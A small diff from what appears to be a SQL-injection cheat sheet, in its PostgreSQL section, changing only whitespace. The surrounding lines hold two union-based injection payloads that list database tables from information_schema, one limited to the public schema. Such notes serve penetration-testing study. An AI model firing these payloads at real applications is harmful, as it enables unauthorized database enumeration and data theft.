@@ -491,7 +491,7 @@ POSTGRESQL
 all tables
 Pets' union select table_name,NULL  from information_schema.tables -- -
 
-
+	
 Select just the ones from the public
 
 pets' union select table_name, null from information_schema.tables where table_schema='public' -- -
